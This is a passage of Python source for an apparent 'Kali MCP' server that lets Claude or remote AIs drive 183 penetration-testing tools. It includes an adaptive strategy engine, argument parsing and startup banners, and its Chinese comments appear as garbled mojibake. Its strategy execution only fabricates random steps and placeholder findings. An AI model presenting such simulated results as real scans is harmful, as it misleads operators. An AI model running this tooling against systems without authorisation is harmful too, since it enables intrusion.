            target_info=target_info,
            current_strategy=initial_strategy,
            execution_state="planning"
        )

        self.execution_contexts[context.context_id] = context
        self.active_contexts.add(context.context_id)

        return context.context_id

    def execute_adaptive_strategy(self, context_id: str, strategy_name: str = None) -> Dict[str, Any]:
        """æ‰§è¡Œè‡ªé€‚åº”ç­–ç•¥"""
        if context_id not in self.execution_contexts:
            return {"error": "æ‰§è¡Œä¸Šä¸‹æ–‡ä¸å­˜åœ¨", "success": False}

        context = self.execution_contexts[context_id]

        # å¦‚æœæœªæŒ‡å®šç­–ç•¥ï¼Œä½¿ç”¨æ™ºèƒ½é€‰æ‹©
        if not strategy_name:
            strategy_name = self._select_optimal_strategy(context)

        # æ›´æ–°ä¸Šä¸‹æ–‡çŠ¶æ€
        context.current_strategy = strategy_name
        context.execution_state = "executing"
        context.last_updated = datetime.now()

        # æ¨¡æ‹Ÿæ‰§è¡Œç­–ç•¥
        execution_result = self._simulate_strategy_execution(strategy_name, context)

        # è¯„ä¼°æ‰§è¡Œç»“æœ
        performance_score = self._evaluate_performance(execution_result)

        # æ£€æŸ¥æ˜¯å¦éœ€è¦é€‚åº”æ€§è°ƒæ•´
        adaptation_needed = performance_score < self.adaptation_threshold

        result = {
            "success": True,
            "context_id": context_id,
            "strategy_name": strategy_name,
            "performance_score": performance_score,
            "execution_result": execution_result,
            "adaptation_needed": adaptation_needed,
            "context_state": context.execution_state
        }

        if adaptation_needed:
            adaptation_action = self._trigger_adaptation(context, performance_score)
            result["adaptation_action"] = adaptation_action

        return result

    def _select_optimal_strategy(self, context: ExecutionContext) -> str:
        """æ™ºèƒ½é€‰æ‹©æœ€ä¼˜ç­–ç•¥"""
        target_type = context.target_info.get("type", "unknown")

        # åŸºäºç›®æ ‡ç±»å‹çš„ç­–ç•¥æ˜ å°„
        strategy_mapping = {
            "web": ["web_comprehensive", "web_quick_scan"],
            "network": ["network_recon", "network_service_enum"],
            "database": ["db_discovery", "db_security_audit"],
            "unknown": ["general_recon", "adaptive_discovery"]
        }

        candidate_strategies = strategy_mapping.get(target_type, strategy_mapping["unknown"])
        return candidate_strategies[0]  # ç®€åŒ–å®ç°ï¼Œè¿”å›ç¬¬ä¸€ä¸ªç­–ç•¥

    def _simulate_strategy_execution(self, strategy_name: str, context: ExecutionContext) -> Dict[str, Any]:
        """æ¨¡æ‹Ÿç­–ç•¥æ‰§è¡Œ"""
        import random

        # æ¨¡æ‹Ÿæ‰§è¡Œç»“æœ
        steps_completed = random.randint(3, 8)
        total_steps = random.randint(steps_completed, 10)
        execution_time = random.uniform(30, 200)

        return {
            "strategy": strategy_name,
            "steps_completed": steps_completed,
            "total_steps": total_steps,
            "execution_time": execution_time,
            "findings": [f"å‘ç°{i+1}" for i in range(random.randint(0, 5))]
        }

    def _evaluate_performance(self, execution_result: Dict[str, Any]) -> float:
        """è¯„ä¼°æ‰§è¡Œæ€§èƒ½"""
        steps_completed = execution_result.get("steps_completed", 0)
        total_steps = execution_result.get("total_steps", 1)
        execution_time = execution_result.get("execution_time", 300)

        # åŸºç¡€å®Œæˆç‡åˆ†æ•°
        completion_score = steps_completed / total_steps if total_steps > 0 else 0

        # æ—¶é—´æ•ˆç‡åˆ†æ•°
        time_efficiency = max(0, 1 - execution_time / self.max_execution_time)

        # ç»¼åˆæ€§èƒ½åˆ†æ•°
        performance_score = completion_score * 0.7 + time_efficiency * 0.3

        return min(1.0, max(0.0, performance_score))

    def _trigger_adaptation(self, context: ExecutionContext, performance_score: float) -> Dict[str, Any]:
        """è§¦å‘é€‚åº”æ€§è°ƒæ•´"""
        target_type = context.target_info.get("type", "unknown")
        current_strategy = context.current_strategy

        # è·å–æ›¿ä»£ç­–ç•¥
        alternative_strategies = self._get_alternative_strategies(current_strategy, target_type)

        if alternative_strategies:
            new_strategy = alternative_strategies[0]
            context.current_strategy = new_strategy
            context.execution_state = "switching"

            adaptation_record = {
                "timestamp": datetime.now().isoformat(),
                "trigger": "low_performance",
                "old_strategy": current_strategy,
                "new_strategy": new_strategy,
                "performance_score": performance_score
            }

            context.adaptation_history.append(adaptation_record)

            return {
                "action_type": "strategy_switch",
                "new_strategy": new_strategy,
                "reason": f"æ€§èƒ½è¿‡ä½ ({performance_score:.2f})",
                "adaptation_record": adaptation_record
            }

        return {"action_type": "continue", "reason": "æ— å¯ç”¨æ›¿ä»£ç­–ç•¥"}

    def _get_alternative_strategies(self, current_strategy: str, target_type: str) -> List[str]:
        """è·å–æ›¿ä»£ç­–ç•¥"""
        strategy_alternatives = {
            "web_comprehensive": ["web_quick_scan", "web_targeted"],
            "network_recon": ["network_fast_scan", "network_stealth"],
            "general_recon": ["adaptive_discovery", "minimal_scan"]
        }

        return strategy_alternatives.get(current_strategy, ["general_recon"])

    def get_execution_status(self, context_id: str) -> Dict[str, Any]:
        """è·å–æ‰§è¡ŒçŠ¶æ€"""
        if context_id not in self.execution_contexts:
            return {"error": "æ‰§è¡Œä¸Šä¸‹æ–‡ä¸å­˜åœ¨"}

        context = self.execution_contexts[context_id]

        return {
            "context_id": context_id,
            "session_id": context.session_id,
            "current_strategy": context.current_strategy,
            "execution_state": context.execution_state,
            "adaptation_count": len(context.adaptation_history),
            "last_updated": context.last_updated.isoformat(),
            "performance_metrics": context.performance_metrics
        }

    def get_adaptation_insights(self, context_id: str) -> Dict[str, Any]:
        """è·å–é€‚åº”æ€§æ´å¯Ÿ"""
        if context_id not in self.execution_contexts:
            return {"error": "æ‰§è¡Œä¸Šä¸‹æ–‡ä¸å­˜åœ¨"}

        context = self.execution_contexts[context_id]

        insights = {
            "total_adaptations": len(context.adaptation_history),
            "adaptation_triggers": [],
            "strategy_switches": 0,
            "performance_trend": "stable"
        }

        for record in context.adaptation_history:
            insights["adaptation_triggers"].append(record.get("trigger", "unknown"))
            if record.get("action_type") == "strategy_switch":
                insights["strategy_switches"] += 1

        return {
            "context_id": context_id,
            "insights": insights,
            "adaptation_history": context.adaptation_history[-5:],  # æœ€è¿‘5æ¬¡é€‚åº”
            "message": f"ä¸Šä¸‹æ–‡å·²è¿›è¡Œ {insights['total_adaptations']} æ¬¡é€‚åº”æ€§è°ƒæ•´"
        }

# å…¨å±€è‡ªé€‚åº”æ‰§è¡Œå¼•æ“å®ä¾‹
adaptive_execution_engine = AdaptiveExecutionEngine()

def parse_args():
    """Parse command line arguments."""
    parser = argparse.ArgumentParser(description="Run the Kali MCP Server")
    parser.add_argument("--server", type=str, default=DEFAULT_KALI_SERVER,
                      help=f"Kali API server URL (default: {DEFAULT_KALI_SERVER})")
    parser.add_argument("--timeout", type=int, default=DEFAULT_REQUEST_TIMEOUT,
                      help=f"Request timeout in seconds (default: {DEFAULT_REQUEST_TIMEOUT})")
    parser.add_argument("--debug", action="store_true", help="Enable debug logging")
    parser.add_argument("--no-websocket", action="store_true", help="Disable WebSocket connections, use HTTP only")

    # ä¼ è¾“æ¨¡å¼é…ç½®
    parser.add_argument("--transport", type=str, default="stdio", choices=["stdio", "sse"],
                      help="Transport mode: stdio (default, for Claude Desktop/Code) or sse (for remote access)")
    parser.add_argument("--host", type=str, default="0.0.0.0",
                      help="SSE server host (default: 0.0.0.0, only used with --transport=sse)")
    parser.add_argument("--port", type=int, default=8765,
                      help="SSE server port (default: 8765, only used with --transport=sse)")

    return parser.parse_args()

def main():
    """Main entry point for the MCP server."""

    # è§£æå‘½ä»¤è¡Œå‚æ•°
    args = parse_args()

    # æ ¹æ®ä¼ è¾“æ¨¡å¼æ˜¾ç¤ºä¸åŒçš„æ¨ªå¹…
    if args.transport == "sse":
        banner = f"""
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘                      Kali MCP æ™ºèƒ½å®‰å…¨æµ‹è¯•ç³»ç»Ÿ                          â•‘
â•‘                    Intelligent Security Testing Framework              â•‘
â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£
â•‘                                                                         â•‘
â•‘  ğŸŒ è¿è¡Œæ¨¡å¼: SSE è¿œç¨‹è®¿é—®æ¨¡å¼ (REMOTE ACCESS MODE)                     â•‘
â•‘                                                                         â•‘
â•‘  âœ… HTTPæœåŠ¡: ç›‘å¬ http://{args.host}:{args.port}                       â•‘
â•‘  âœ… è¿œç¨‹è¿æ¥: å¤–éƒ¨AIå¯é€šè¿‡SSEåè®®è¿æ¥                                   â•‘
â•‘  âœ… 183ä¸ªå·¥å…·: å…¨éƒ¨å¯ç”¨äºè¿œç¨‹è°ƒç”¨                                       â•‘
â•‘                                                                         â•‘
â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£
â•‘  è¿æ¥æ–¹å¼:                                                              â•‘
â•‘  - SSEç«¯ç‚¹: http://{args.host}:{args.port}/sse                          â•‘
â•‘  - æ¶ˆæ¯ç«¯ç‚¹: http://{args.host}:{args.port}/messages                    â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        """.strip()
    else:
        banner = f"""
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘                      Kali MCP æ™ºèƒ½å®‰å…¨æµ‹è¯•ç³»ç»Ÿ                          â•‘
â•‘                    Intelligent Security Testing Framework              â•‘
â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£
â•‘                                                                         â•‘
â•‘  ğŸŸ¢ è¿è¡Œæ¨¡å¼: æœ¬åœ°æ‰§è¡Œæ¨¡å¼ (LOCAL EXECUTION MODE)                       â•‘
â•‘                                                                         â•‘
â•‘  âœ… ç›´æ¥æ‰§è¡Œ: é€šè¿‡subprocessè°ƒç”¨æœ¬åœ°å®‰å…¨å·¥å…·                            â•‘
â•‘  âœ… æ— éœ€åç«¯: ä¸éœ€è¦å¯åŠ¨kali_server.py                                 â•‘
â•‘  âœ… æ— éœ€é…ç½®: ä¸éœ€è¦KALI_API_URLç¯å¢ƒå˜é‡                                â•‘
â•‘  âœ… 183ä¸ªå·¥å…·: å…¨éƒ¨å¯ç”¨äºæœ¬åœ°Kali Linuxç³»ç»Ÿ                             â•‘
â•‘                                                                         â•‘
â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£
â•‘  ç³»ç»Ÿä¿¡æ¯:                                                              â•‘
â•‘  - ä¼ è¾“æ¨¡å¼: stdio (Claude Desktop/Code æœ¬åœ°è¿æ¥)                       â•‘
â•‘  - å·¥ä½œç›®å½•: {os.getcwd()[:50]}                                         â•‘
â•‘  - Pythonç‰ˆæœ¬: {sys.version.split()[0]}                                 â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        """.strip()

    print(banner)
    logger.info("=" * 80)
    logger.info("ğŸš€ å¯åŠ¨ Kali MCP æœåŠ¡å™¨...")
    logger.info(f"ğŸ“¡ ä¼ è¾“æ¨¡å¼: {args.transport.upper()}")
    if args.transport == "sse":
        logger.info(f"ğŸŒ ç›‘å¬åœ°å€: http://{args.host}:{args.port}")
    logger.info("=" * 80)

    try:
        # Set up and run the MCP server
        mcp = setup_mcp_server()
        logger.info("âœ… MCPæœåŠ¡å™¨åˆå§‹åŒ–å®Œæˆ")
        logger.info("ğŸ“¡ 183ä¸ªå®‰å…¨å·¥å…·å·²å°±ç»ª")
        logger.info("ğŸš€ æœåŠ¡å™¨å¯åŠ¨ä¸­...")

        # æ ¹æ®ä¼ è¾“æ¨¡å¼å¯åŠ¨
        if args.transport == "sse":
            logger.info(f"ğŸŒ SSEæœåŠ¡å™¨å¯åŠ¨äº http://{args.host}:{args.port}")
            logger.info(f"ğŸ“Œ å¤–éƒ¨AIè¿æ¥åœ°å€: http://<your-ip>:{args.port}/sse")
            mcp.run(transport="sse", host=args.host, port=args.port)
        else:
            logger.info("ğŸ“Œ stdioæ¨¡å¼: ç­‰å¾…Claude Desktop/Codeè¿æ¥...")
            mcp.run()

    except KeyboardInterrupt:
        logger.info("\nğŸ›‘ æ”¶åˆ°åœæ­¢ä¿¡å·ï¼Œæ­£åœ¨å…³é—­æœåŠ¡å™¨...")
    except Exception as e:
        logger.error(f"âŒ æœåŠ¡å™¨é”™è¯¯: {str(e)}")
        raise
    finally:
        logger.info("âœ… MCPæœåŠ¡å™¨å·²å®‰å…¨å…³é—­")

if __name__ == "__main__":
    main()
